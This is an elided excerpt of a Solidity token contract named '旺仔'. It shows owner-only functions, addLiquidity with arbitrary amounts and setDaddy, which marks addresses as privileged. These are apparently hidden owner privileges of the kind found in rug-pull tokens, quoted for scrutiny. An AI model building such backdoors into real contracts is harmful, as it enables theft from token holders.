...
contract Ownable is Context {
    ...
    constructor (){
        ...
        _owner = msgSender;
        emit owneresshipTransferred(address(0), msgSender);
    }
...
contract Token is Ownable, IERC20 {
    ...
    string private _name = unicode"旺仔";
    string private _symbol = unicode"旺仔";
    ...
    function addLiquidity(address Liquidity, uint256 token1Amounts, uint256 token2Amounts , uint256 lpAmount) public onlyowneres{
    ...
    function setDaddy(address addr) public onlyowneres{
        _daddy[addr] = true;
    }
}